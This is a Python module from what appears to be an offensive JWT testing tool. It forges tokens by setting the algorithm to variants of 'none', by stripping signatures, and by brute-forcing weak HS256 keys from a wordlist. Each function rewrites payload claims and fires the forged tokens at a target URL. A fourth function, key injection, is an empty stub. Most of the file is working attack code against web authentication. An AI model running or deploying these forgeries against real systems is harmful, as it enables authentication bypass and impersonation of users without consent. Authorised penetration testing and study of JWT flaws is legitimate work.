import base64
import json
import jwt as pyjwt
import HTTP_Module as HTTPm
from tqdm import tqdm

# token - sample JWT; corrections - list of changes to apply to payload 
def alg_none(token, corrections, url, mode):
    
    alg_names = ["NONE", "None", "none", "NoNe", "nOnE"]
    header, payload, signature = token.split(".")

    # == in case of incorrect padding 
    header_dict = json.loads(base64.urlsafe_b64decode(header + "=="))
    payload_dict = json.loads(base64.urlsafe_b64decode(payload + "=="))

    if corrections != None:
    # looping through the payload 
        for correction in corrections:
            payload_dict[correction[0]] = correction[1]

    for name in alg_names:
        header_dict["alg"] = name

        exp_header = base64.urlsafe_b64encode(json.dumps(header_dict).encode()).decode("utf-8").replace("=","")
        exp_payload = base64.urlsafe_b64encode(json.dumps(payload_dict).encode()).decode("utf-8").replace("=","")

        jwt = exp_header + "." + exp_payload + "."
        HTTPm.request(jwt, None, url, mode)


def sign_null(token, corrections, url, mode):
    header, payload, signature = token.split(".")

    # == in case of incorrect padding 
    payload_dict = json.loads(base64.urlsafe_b64decode(payload + "=="))

    if corrections != None:
    # looping through the payload 
        for correction in corrections:
            payload_dict[correction[0]] = correction[1]

    exp_header = header
    exp_payload = base64.urlsafe_b64encode(json.dumps(payload_dict).encode()).decode("utf-8").replace("=","")

    jwt = exp_header + "." + exp_payload + "."
    HTTPm.request(jwt, None, url, mode)


def weak_key(token, corrections, wordlist, url, mode):
    jwts = []
    header, payload, signature = token.split(".")
    attack_dict = open(wordlist, "r", errors="ignore").read().split("\n")

    # == in case of incorrect padding 
    payload_dict = json.loads(base64.urlsafe_b64decode(payload + "=="))
    header_dict = json.loads(base64.urlsafe_b64decode(header + "=="))

    if corrections != None:
    # looping through the payload 
        for correction in corrections:
            payload_dict[correction[0]] = correction[1]

    for key in tqdm(attack_dict, bar_format="{l_bar}{bar:30}{r_bar}{bar:-30b}", colour="WHITE"):
        jwt = pyjwt.encode(payload_dict, key, headers=header_dict, algorithm="HS256")
        if HTTPm.request(jwt, key, url, mode):
            break


def key_injection(token, corrections, url, mode):
    pass